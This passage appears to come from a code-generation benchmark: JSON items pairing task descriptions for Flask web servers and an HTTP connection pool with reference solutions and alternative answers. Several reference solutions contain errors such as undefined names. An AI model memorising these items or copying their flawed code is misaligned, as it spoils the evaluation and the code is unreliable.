get_replicas() -> dict - Handles GET requests to retrieve current replica information (route: /{api_version}/replicas). Returns a response dictionary with current resources.",
    "Canonical_solution": "from flask import Flask, request\nimport json\nfrom threading import Thread\nfrom queue import Queue\n\nclass Creator:\n    def __init__(self, learner_addr, collector_addr):\n        self.learner_addr = learner_addr\n        self.collector_addr = collector_addr\n        self.collector_demand = Queue()\n        self.learner_demand = Queue()\n        self.learners = {}\n        self.collectors = {}\n        self.end_flag = False\n\n    def set_target_source(self, learner_target, collector_target):\n        self.collector_demand.put(collector_target)\n        self.learner_demand.put(learner_target)\n\n    def start(self):\n        while not self.end_flag:\n            if self.learner_demand.empty() and self.collector_demand.empty():\n                continue\n            else:\n                learner_demand, collector_demand = None, None\n                if not self.learner_demand.empty():\n                    learner_demand = self.learner_demand.get()\n                if not self.collector_demand.empty():\n                    collector_demand = self.collector_demand.get()\n\n                for i in range(collector_demand):\n                    name, host, port = self.collector_addr[i]\n                    self.collectors[name] = NaiveCollector(host, port, prefix=DATA_PREFIX)\n                    self.collectors[name].start()\n                for i in range(learner_demand):\n                    name, host, port = self.learner_addr[i]\n                    self.learners[name] = NaiveLearner(host, port, prefix=DATA_PREFIX)\n                    self.learners[name].start()\n\n    def close(self):\n        self.end_flag = True\n        for t in self.learners.values():\n            t.close()\n        for t in self.collectors.values():\n            t.close()\n\n    @property\n    def current_resource(self):\n        collectors = {k: {} for k in self.collectors}\n        learners = {k: {} for k in self.learners}\n        return {\"collectors\": collectors, 'learners': learners}\n\nclass FlaskOperatorServer:\n    def __init__(self, creator, host: str, port: int, api_version: str = 'v1alpha1'):\n        self.app = Flask(__name__)\n        self.creator = creator\n        self.host = host\n        self.port = port\n        self.api_version = api_version\n        \n        @self.app.route('/{}/replicas'.format(self.api_version), methods=['POST'])\n        def post_replicas():\n            data = json.loads(request.data.decode())\n            collectors = data['collectors'][\"replicas\"]\n            learners = data['learners'][\"replicas\"]\n            self.creator.set_target_source(learners, collectors)\n            return {'success': True, 'code': 0, 'message': '', 'data': ''}\n\n        @self.app.route('/{}/replicas'.format(self.api_version), methods=['GET'])\n        def get_replicas():\n            data = json.loads(request.data.decode())\n            return {'success': True, 'code': 0, 'message': '', 'data': self.creator.current_resource}\n\n    def run(self):\n        self.app.run(host=self.host, port=self.port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\nclass FlaskOperatorServer:\n    def __init__(self, creator, host: str, port: int, api_version: str = 'v1alpha1') -> None:\n        self.app = Flask(__name__)\n        self.creator = creator\n        self.host = host\n        self.port = port\n        self.api_version = api_version\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(f'/{self.api_version}/replicas', methods=['POST'])\n        def post_replicas():\n            data = request.get_json()\n            learner_replicas = data.get('learner_replicas', 0)\n            collector_replicas = data.get('collector_replicas', 0)\n            self.creator.scale(learner_replicas, collector_replicas)\n            return jsonify({\n                'status': 'success',\n                'desired': {\n                    'learners': learner_replicas,\n                    'collectors': collector_replicas\n                }\n            })\n\n        @self.app.route(f'/{self.api_version}/replicas', methods=['GET'])\n        def get_replicas():\n            current = self.creator.status()\n            return jsonify({\n                'current': current\n            })\n\n    def run(self) -> None:\n        self.app.run(host=self.host, port=self.port)"
  },
  {
    "Task_id": 144,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests and responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different aspects of HTTP request handling: delayed response, request method detection, and JSON response.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter 'time' (integer): Milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (automatically detects HTTP method)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - Response text: 'Response from Flask' \n  - Headers: Access-Control-Allow-Origin: *\n  - After specified delay\n- For '/request_type' endpoint: \n  - Response text: 'Request Type: [METHOD]' \n  - Headers: Access-Control-Allow-Origin: *\n- For '/json' endpoint: \n  - JSON response: {'resp': 'Hello JSON!'}",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    delay = int(request.args.get('time', 0)) / 1000.0\n    time.sleep(delay)\n    response = app.make_response('Response from Flask')\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    response = app.make_response(f'Request Type: {method}')\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/json')\ndef json_response():\n    return jsonify({'resp': 'Hello JSON!'})"
  },
  {
    "Task_id": 145,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles POST requests for game predictions, processing board state data and returning optimal actions.\n\nFunction Description: The `predict` function is a Flask route handler that processes incoming game board states, applies either an AlphaZero-inspired MCTS algorithm or a greedy random player to determine the best move, and returns the action as a response.\n\nInput:\n- HTTP POST request with form data containing:\n  - 'board': [string] - Comma-separated string representing the game board state\n\nOutput:\n- HTTP Response containing:\n  - Body: [string] - The predicted action index\n  - Headers: Includes CORS permission ('Access-Control-Allow-Origin': '*')",
    "Canonical_solution": "import os\nimport sys\nimport numpy as np\nfrom flask import Flask, request, Response\n\nsys.path.append(\"..\")\nfrom utils import dotdict\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    board = np.fromstring(request.form['board'], sep=',').reshape(g.getBoardSize())\n\n    use_alpha_zero = True\n    if use_alpha_zero:\n        action = np.argmax(mcts.getActionProb(board, temp=0))\n    else:\n        action = GreedyRandomPlayer(g).play(board)\n\n    resp = Response(str(action))\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0', port=8888)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom game import Game\nfrom mcts import MCTS\nimport numpy as np\nimport random\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    board_str = request.form.get('board')\n    if not board_str:\n        return '', 400\n    \n    try:\n        board_state = list(map(int, board_str.split(',')))\n    except ValueError:\n        return '', 400\n    \n    game = Game()\n    game.board = np.array(board_state).reshape((3, 3))\n    \n    if random.random() < 0.5:\n        action = random.choice(game.get_valid_moves())\n    else:\n        mcts = MCTS(game)\n        action = mcts.get_best_move(temp=1)\n    \n    response = jsonify({'action': int(action)})\n    response.headers.add('Access-Control-Allow-Origin', '*')\n    return response\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 146,
    "Instruction": "Task Description: Create a Flask web application that handles form submissions, stores the data in both text and CSV formats, and redirects to a thank you page upon successful submission.\n\nFunction Description: The function handles form submissions via POST and GET requests. For POST requests, it extracts form data, writes it to both a text file and CSV file, then redirects to a thank you page. For GET requests or errors, it returns an error message.\n\nInput: \n- HTTP request object (via Flask's request) containing form data with keys: \"email\", \"subject\", and \"message\"\n\nOutput:\n- For successful POST requests: HTTP redirect to './thank_you.html'\n- For GET requests or errors: String error message 'Something went wrong. Try again!'",
    "Canonical_solution": "from flask import Flask, render_template, request, redirect\nimport csv\napp = Flask(__name__)\n\n@app.route('/submit_form', methods=['POST', 'GET'])\ndef submit_form():\n\tif request.method == \"POST\":\n\t\tdata = request.form.to_dict()\n\t\twrite_to_csv(data)\n\t\twrite_to_txt(data)\n\t\treturn redirect('./thank_you.html')\n\telse:\n\t\treturn 'Something went wrong. Try again!'\n\ndef write_to_txt(data):\n\temail = data[\"email\"]\n\tsubject = data[\"subject\"]\n\tmessage = data[\"message\"]\n\twith open(\"./database.txt\", mode = 'a') as database:\n\t\ttext = database.write(f\"\\n{email},{subject},{message}\")\n\ndef write_to_csv(data):\n\temail = data[\"email\"]\n\tsubject = data[\"subject\"]\n\tmessage = data[\"message\"]\n\twith open(\"./database.csv\", mode = 'a', newline='') as database2:\n\t\tcsv_writer = csv.writer(database2, delimiter=',', quotechar='\"', quoting=csv.QUOTE_MINIMAL)\n\t\tcsv_writer.writerow([email, subject, message])",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, redirect\nimport csv\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST', 'GET'])\ndef submit():\n    if request.method == 'POST':\n        email = request.form.get('email')\n        subject = request.form.get('subject')\n        message = request.form.get('message')\n\n        if not all([email, subject, message]):\n            return 'Something went wrong. Try again!'\n\n        try:\n            with open('form_data.txt', 'a') as f:\n                f.write(f\"Email: {email}, Subject: {subject}, Message: {message}\\n\")\n\n            with open('form_data.csv', 'a', newline='') as csvfile:\n                writer = csv.writer(csvfile)\n                if csvfile.tell() == 0:\n                    writer.writerow(['email', 'subject', 'message'])\n                writer.writerow([email, subject, message])\n\n            return redirect('./thank_you.html')\n        except Exception:\n            return 'Something went wrong. Try again!'\n    else:\n        return 'Something went wrong. Try again!'"
  },
  {
    "Task_id": 147,
    "Instruction": "Task Description: Create a Flask-based HTTP server class that handles streaming responses from a model pipeline, manages concurrent requests, and provides available method information.\n\nClass Description: ModelServer is a Flask application wrapper that provides HTTP endpoints for interacting with a model pipeline. It handles streaming responses, manages concurrent access to the model, and provides information about available methods.\n\nAttributes:\n- app: Flask - The Flask application instance\n- model: Any - The model pipeline object that processes requests\n- cors: CORS - Cross-Origin Resource Sharing configuration for the Flask app\n\nMethods:\n- __init__(model) -> None - Initializes the Flask app and sets up routes\n  - model: Any - The model pipeline object to be used for processing\n- run(host, port, debug) -> None - Starts the Flask server\n  - host: str (default=\"0.0.0.0\") - The host address to bind to\n  - port: int (default=5000) - The port number to listen on\n  - debug: bool (default=True) - Whether to run in debug mode\n- stream() -> Response - Handles streaming requests to the model\n  - Returns: Flask Response - A streaming response with model outputs\n- methods() -> Response - Provides information about available methods\n  - Returns: Flask Response - JSON response containing available methods",
    "Canonical_solution": "from flask import Flask, Response, stream_with_context, request\nfrom flask_cors import CORS, cross_origin\nimport json\nimport concurrent.futures\nimport time\n\nclass ModelServer:\n    def __init__(self, model):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.model = model\n\n        @self.app.route('/stream', methods=['GET', 'POST'])\n        @cross_origin()\n        def stream():\n            data = json.loads(request.data)\n            user_input = data[\"text\"]\n            top_k = data[\"top_k\"]\n            method = data[\"method\"]\n\n            def generate(model):\n                if model.inuse:\n                    return Response(json.dumps({\n                        \"method_name\": \"error\",\n                        \"error\": \"Model in use\"\n                    }), status=409, mimetype='application/json')\n                \n                model.inuse = True\n                with concurrent.futures.ThreadPoolExecutor() as executor:\n                    future = executor.submit(model.run_pipeline, user_input, method, top_k)\n                    while True:\n                        if model.queue.empty():\n                            if future.done():\n                                break\n                            time.sleep(0.01)\n                            continue\n                        else:\n                            obj = model.queue.get()\n                        if obj[\"method_name\"] == \"unknown\": continue\n                        if obj[\"method_name\"] == \"on_request_end\":\n                            yield json.dumps(obj)\n                            break\n\n                        try:\n                            yield json.dumps(obj) + \"\\n\"\n                        except Exception as e:\n                            model.inuse = False\n                            print(e)\n\n                    try:\n                        future.result()\n                    except Exception as e:\n                        model.inuse = False\n                        print(e)\n\n                model.inuse = False\n\n            return Response(stream_with_context(generate(self.model)))\n\n        @self.app.route('/methods', methods=['GET'])\n        @cross_origin()\n        def methods():\n            return Response(json.dumps({\n                \"methods\": [\"DFS_woFilter_w2\"]\n            }), status=200, mimetype='application/json')\n\n    def run(self, host=\"0.0.0.0\", port=5000, debug=True):\n        self.app.run(use_reloader=False, host=host, debug=debug, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, Response, jsonify\nfrom flask_cors import CORS\nimport threading\n\nclass ModelServer:\n    def __init__(self, model):\n        self.app = Flask(__name__)\n        self.model = model\n        self.cors = CORS(self.app)\n        self.lock = threading.Lock()\n\n        @self.app.route('/stream', methods=['GET'])\n        def stream():\n            return self.stream()\n\n        @self.app.route('/methods', methods=['GET'])\n        def methods():\n            return self.methods()\n\n    def run(self, host=\"0.0.0.0\", port=5000, debug=True):\n        self.app.run(host=host, port=port, debug=debug)\n\n    def stream(self):\n        def generate():\n            with self.lock:\n                for output in self.model.process():\n                    yield output + '\\n'\n\n        return Response(generate(), mimetype='text/plain')\n\n    def methods(self):\n        available_methods = {\n            \"GET /stream\": \"Stream model outputs\",\n            \"GET /methods\": \"List available API methods\"\n        }\n        return jsonify(available_methods)"
  },
  {
    "Task_id": 148,
    "Instruction": "Task Description: Create a Flask-based web service that predicts cricket match scores based on various input parameters including teams, overs, runs, and wickets.\n\nFunction Description: The `predict()` function is a Flask route handler that processes POST requests containing cricket match data, converts the input into a feature vector, uses a pre-trained model to predict the score range, and returns an HTML response with the prediction.\n\nInput:\n- HTTP POST request with form data containing:\n  - 'batting-team': [str] - Name of the batting team (one of 8 possible teams)\n  - 'bowling-team': [str] - Name of the bowling team (one of 8 possible teams)\n  - 'overs': [float] - Current over count in the match\n  - 'runs': [int] - Total runs scored so far\n  - 'wickets': [int] - Total wickets lost so far\n  - 'runs_in_prev_5': [int] - Runs scored in previous 5 overs\n  - 'wickets_in_prev_5': [int] - Wickets lost in previous 5 overs\n\nOutput:\n- Rendered HTML template ('index1.html') containing:\n  - 'prediction_text': [str] - Formatted string showing predicted score range (prediction \u00b1 margin)",
    "Canonical_solution": "from flask import Flask, render_template, request\nimport pickle\nimport numpy as np\n\nfilename = 'model.pkl'\nregressor = pickle.load(open(filename, 'rb'))\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    temp_array = list()\n    \n    if request.method == 'POST':\n        \n        batting_team = request.form['batting-team']\n        if batting_team == 'Chennai Super Kings':\n            temp_array = temp_array + [1,0,0,0,0,0,0,0]\n        elif batting_team == 'Delhi Daredevils':\n            temp_array = temp_array + [0,1,0,0,0,0,0,0]\n        elif batting_team == 'Kings XI Punjab':\n            temp_array = temp_array + [0,0,1,0,0,0,0,0]\n        elif batting_team == 'Kolkata Knight Riders':\n            temp_array = temp_array + [0,0,0,1,0,0,0,0]\n        elif batting_team == 'Mumbai Indians':\n            temp_array = temp_array + [0,0,0,0,1,0,0,0]\n        elif batting_team == 'Rajasthan Royals':\n            temp_array = temp_array + [0,0,0,0,0,1,0,0]\n        elif batting_team == 'Royal Challengers Bangalore':\n            temp_array = temp_array + [0,0,0,0,0,0,1,0]\n        elif batting_team == 'Sunrisers Hyderabad':\n            temp_array = temp_array + [0,0,0,0,0,0,0,1]\n            \n            \n        bowling_team = request.form['bowling-team']\n        if bowling_team == 'Chennai Super Kings':\n            temp_array = temp_array + [1,0,0,0,0,0,0,0]\n        elif bowling_team == 'Delhi Daredevils':\n            temp_array = temp_array + [0,1,0,0,0,0,0,0]\n        elif bowling_team == 'Kings XI Punjab':\n            temp_array = temp_array + [0,0,1,0,0,0,0,0]\n        elif bowling_team == 'Kolkata Knight Riders':\n            temp_array = temp_array + [0,0,0,1,0,0,0,0]\n        elif bowling_team == 'Mumbai Indians':\n            temp_array = temp_array + [0,0,0,0,1,0,0,0]\n        elif bowling_team == 'Rajasthan Royals':\n            temp_array = temp_array + [0,0,0,0,0,1,0,0]\n        elif bowling_team == 'Royal Challengers Bangalore':\n            temp_array = temp_array + [0,0,0,0,0,0,1,0]\n        elif bowling_team == 'Sunrisers Hyderabad':\n            temp_array = temp_array + [0,0,0,0,0,0,0,1]\n            \n            \n        overs = float(request.form['overs'])\n        runs = int(request.form['runs'])\n        wickets = int(request.form['wickets'])\n        runs_in_prev_5 = int(request.form['runs_in_prev_5'])\n        wickets_in_prev_5 = int(request.form['wickets_in_prev_5'])\n        \n        temp_array = temp_array + [overs, runs, wickets, runs_in_prev_5, wickets_in_prev_5]\n        \n        data = np.array([temp_array])\n        my_prediction = int(regressor.predict(data)[0])\n              \n        return render_template('index1.html',prediction_text=\"Predicted score ranges between {} to {}\".format(my_prediction-10,my_prediction+5))",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\nimport pickle\nimport numpy as np\n\napp = Flask(__name__)\nmodel = pickle.load(open('cricket_score_predictor.pkl', 'rb'))\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    batting_team = request.form['batting-team']\n    bowling_team = request.form['bowling-team']\n    overs = float(request.form['overs'])\n    runs = int(request.form['runs'])\n    wickets = int(request.form['wickets'])\n    runs_in_prev_5 = int(request.form['runs_in_prev_5'])\n    wickets_in_prev_5 = int(request.form['wickets_in_prev_5'])\n\n    teams = ['Team-A', 'Team-B', 'Team-C', 'Team-D', 'Team-E', 'Team-F', 'Team-G', 'Team-H']\n    \n    batting_team_encoded = [1 if team == batting_team else 0 for team in teams]\n    bowling_team_encoded = [1 if team == bowling_team else 0 for team in teams]\n\n    final_features = np.array([[\n        overs, runs, wickets, runs_in_prev_5, wickets_in_prev_5, \n        *batting_team_encoded, *bowling_team_encoded\n    ]])\n\n    prediction = model.predict(final_features)[0]\n    margin = 10\n    prediction_text = f\"Predicted Score: {int(prediction - margin)} - {int(prediction + margin)}\"\n\n    return render_template('index1.html', prediction_text=prediction_text)\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 149,
    "Instruction": "Task Description: Create a Flask web application that handles HTTP requests on a '/hello' endpoint, processes form data, and returns a rendered HTML template with the processed data.\n\nFunction Description: The function 'hello' is a Flask route handler that responds to both GET and POST requests at the '/hello' endpoint. It retrieves form data from the request, processes it, and renders an HTML template ('greeting.html') with the form data as template variables.\n\nInput: \n- The function receives HTTP requests (GET or POST) containing form data with two fields:\n  - 'say': [str] - The greeting message to be displayed\n  - 'to': [str] - The recipient of the greeting\n\nOutput:\n- Returns a rendered HTML template ('greeting.html') populated with the form data:\n  - Template variable 'say' contains the greeting message\n  - Template variable 'to' contains the recipient name",
    "Canonical_solution": "from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route('/hello', methods=['GET', 'POST'])\ndef hello():\n    return render_template('greeting.html', say=request.form['say'], to=request.form['to'])\n\nif __name__ == \"__main__\":\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\n\napp = Flask(__name__)\n\n@app.route('/hello', methods=['GET', 'POST'])\ndef hello():\n    say = ''\n    to = ''\n    if request.method == 'POST':\n        say = request.form.get('say', '')\n        to = request.form.get('to', '')\n    return render_template('greeting.html', say=say, to=to)"
  },
  {
    "Task_id": 15,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, handling connection creation, request execution, and response processing with support for retries, timeouts, and proxy configurations.\n\nClass Description: HTTPConnectionPool is a connection pooling class that manages HTTP connections to a specific host, providing methods to create connections, make requests, and handle responses with configurable timeouts and retries.\n\nAttributes:\n\nscheme: str - The URL scheme (default \"http\")\nConnectionCls: class - The connection class to use (default HTTPConnection)\nhost: str - The target host for connections\nport: int - The target port for connections (default None)\ntimeout: Timeout - The timeout configuration for connections\nretries: Retry - The retry configuration for failed requests\nproxy: str - The proxy URL if configured (default None)\nproxy_headers: dict - Headers to use for proxy connections (default {})\nconn_kw: dict - Additional connection keyword arguments\n\nMethods:\n\n_new_conn() -> HTTPConnection - Creates and returns a new HTTP connection instance, incrementing the connection counter.\n\n_make_request(conn: HTTPConnection, method: str, url: str, timeout: Timeout = _Default, chunked: bool = False, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection, handling timeouts and errors. Returns the HTTP response.\n\nurlopen(method: str, url: str, body: Optional[bytes] = None, headers: Optional[dict] = None, retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, timeout: Timeout = _Default, pool_timeout: Optional[float] = None, release_conn: Optional[bool] = None, chunked: bool = False, **response_kw) -> HTTPResponse - Main method to open a URL using the connection pool, handling connection management, request execution, and response processing. Returns an HTTPResponse object.",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    MaxRetryError,\n    ProtocolError,\n    TimeoutError,\n    SSLError,\n    ProxyError,\n    ClosedPoolError,\n    NewConnectionError,\n)\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import get_host, parse_url\nfrom .response import HTTPResponse\nimport logging\nimport socket\nimport sys\nimport warnings\n\nlog = logging.getLogger(__name__)\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        self.num_connections += 1\n        log.debug(\n            \"Starting new HTTP connection (%d): %s:%s\",\n            self.num_connections,\n            self.host,\n            self.port or \"80\",\n        )\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        self.num_requests += 1\n        timeout_obj = self._get_timeout(timeout)\n        timeout_obj.start_connect()\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, \"sock\", None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, \"Read timed out. (read timeout=%s)\" % read_timeout\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        destination_scheme = parsed_url.scheme\n        headers = headers or self.headers\n        retries = retries or self.retries\n\n        conn = None\n        release_this_conn = release_conn\n        http_tunnel_required = connection_requires_http_tunnel(\n            self.proxy, self.proxy_config, destination_scheme\n        )\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            if http_tunnel_required:\n                self._prepare_proxy(conn)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            response = HTTPResponse.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn if not release_conn else None,\n                retries=retries,\n                **response_kw\n            )\n\n        except (EmptyPoolError, TimeoutError, SSLError, ProxyError, ProtocolError) as e:\n            if conn:\n                conn.close()\n                conn = None\n            raise\n\n        finally:\n            if release_this_conn and conn:\n                self._put_conn(conn)\n\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import socket\nfrom http.client import HTTPConnection, HTTPResponse\nfrom urllib.parse import urlparse\nfrom typing import Optional, Dict, Any, Type\nimport time\n\nclass Timeout:\n    def __init__(self, total: float = None, connect: float = None, read: float = None):\n        self.total = total\n        self.connect = connect\n        self.read = read\n\n    def clone(self) -> 'Timeout':\n        return Timeout(total=self.total, connect=self.connect, read=self.read)\n\nclass Retry:\n    def __init__(self, total: int = 3, connect: int = 3, read: int = 3, redirect: int = 3, status: int = 3):\n        self.total = total\n        self.connect = connect\n        self.read = read\n        self.redirect = redirect\n        self.status = status\n\nclass HTTPConnectionPool:\n    DEFAULT_TIMEOUT = 3.0\n\n    def __init__(self, host: str, port: Optional[int] = None, scheme: str = \"http\",\n                 timeout: Optional[Timeout] = None, retries: Optional[Retry] = None,\n                 proxy: Optional[str] = None, proxy_headers: Optional[Dict] = None, **conn_kw):\n        self.scheme = scheme\n        self.host = host\n        self.port = port\n        self.timeout = timeout or Timeout(connect=3.0, read=3.0)\n        self.retries = retries or Retry()\n        self.proxy = proxy\n        self.proxy_headers = proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.ConnectionCls: Type[HTTPConnection] = HTTPConnection\n        self.num_connections = 0\n\n    def _new_conn(self) -> HTTPConnection:\n        self.num_connections += 1\n        conn = self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect if self.timeout else self.DEFAULT_TIMEOUT,\n            **self.conn_kw\n        )\n        return conn\n\n    def _make_request(self, conn: HTTPConnection, method: str, url: str,\n                      timeout: Timeout = None, chunked: bool = False,\n                      **httplib_request_kw) -> HTTPResponse:\n        timeout = timeout if timeout is not None else self.timeout\n        if timeout and timeout.total:\n            start_time = time.time()\n\n        try:\n            if timeout and timeout.total:\n                conn.sock.settimeout(timeout.total)\n\n            conn.request(method, url, **httplib_request_kw)\n            response = conn.getresponse()\n\n            if timeout and timeout.total:\n                elapsed = time.time() - start_time\n                conn.sock.settimeout(timeout.total - elapsed)\n\n            return response\n        except socket.timeout as e:\n            raise Exception(\"Request timed out\") from e\n        except Exception as e:\n            conn.close()\n            raise Exception(f\"Request failed: {str(e)}\") from e\n\n    def urlopen(self, method: str, url: str, body: Optional[bytes] = None,\n                headers: Optional[Dict] = None, retries: Optional[Retry] = None,\n                redirect: bool = True, assert_same_host: bool = True,\n                timeout: Timeout = None, pool_timeout: Optional[float] = None,\n                release_conn: Optional[bool] = None, chunked: bool = False,\n                **response_kw) -> HTTPResponse:\n        retries = retries if retries is not None else self.retries\n        timeout = timeout if timeout is not None else self.timeout.clone()\n        conn = self._new_conn()\n\n        for attempt in range(retries.total + 1):\n            try:\n                if assert_same_host:\n                    parsed_url = urlparse(url)\n                    if parsed_url.hostname != self.host:\n                        raise ValueError(\"URL hostname does not match connection pool host\")\n\n                response = self._make_request(conn, method, url, timeout=timeout,\n                                              chunked=chunked, body=body, headers=headers)\n                if 500 <= response.status < 600 and attempt < retries.status:\n                    conn.close()\n                    conn = self._new_conn()\n                    continue\n                return response\n            except Exception as e:\n                if attempt < retries.total:\n                    conn.close()\n                    conn = self._new_conn()\n                    continue\n                else:\n                    raise e\n\n        raise Exception(\"Unexpected error during request\")"
  },
  {
    "Task_id": 151,
    "Instruction": "Task Description: Create a Python class that implements a web server using Flask framework with authentication, search functionality, and WebSocket support. The server should handle HTTP requests, manage user sessions, and provide search capabilities against a data model.\n\nClass Description: MalcomWeb is a Process subclass that implements a web server with Flask. It handles HTTP requests, manages authentication, provides search functionality against a data model, and supports WebSocket connections. The server can be configured through a setup dictionary and runs in its own process.\n\nAttributes:\n\nlisten_port: [int] - The port number on which the server listens\nlisten_interface: [str] - The network interface on which the server listens\nsetup: [dict] - Configuration dictionary for server settings\nhttp_server: [WSGIServer] - Instance of the WSGI server\napp: [Flask] - Flask application instance\n\nMethods:\n\n__init__: [Name](auth, listen_port, listen_interface, setup) -> [None] - Initializes the web server process with authentication settings, port, interface, and configuration\nrun: [Name]() -> [None] - Starts the server process (inherited from Process)\nstop_server: [Name]() -> [None] - Stops the server (currently just a placeholder)\nstart_server: [Name]() -> [None] - Configures and starts the Flask application with routes and WebSocket support\nindex: [Name]() -> [Response] - Route handler for the root URL (requires login)\nsearch: [Name](term=\"\") -> [Response] - Route handler for search functionality (requires login), processes both GET and POST requests",
    "Canonical_solution": "from flask import Flask, request, render_template, redirect, url_for, make_response\nfrom gevent.pywsgi import WSGIServer\nfrom geventwebsocket.handler import WebSocketHandler\nfrom multiprocessing import Process\n\nclass MalcomWeb(Process):\n    def __init__(self, auth, listen_port, listen_interface, setup):\n        super(MalcomWeb, self).__init__()\n        self.setup = setup\n        self.listen_port = setup['LISTEN_PORT']\n        self.listen_interface = setup['LISTEN_INTERFACE']\n        self.http_server = None\n        self.app = Flask(__name__)\n        self.app.secret_key = os.urandom(24)\n        self.app.debug = True\n\n    def run(self):\n        self.start_server()\n\n    def stop_server(self):\n        pass\n\n    def start_server(self):\n        if not self.setup['AUTH']:\n            self.app.config['LOGIN_DISABLED'] = True\n\n        self.app.config['MODEL'] = ModelClass(self.setup)\n        self.app.config['USER_MANAGER'] = UserManagerClass(self.setup)\n\n        lm.init_app(self.app)\n        lm.login_view = 'login'\n        lm.session_protection = 'strong'\n        lm.anonymous_user = self.app.config['USER_MANAGER'].get_default_user\n\n        for key in self.setup:\n            self.app.config[key] = 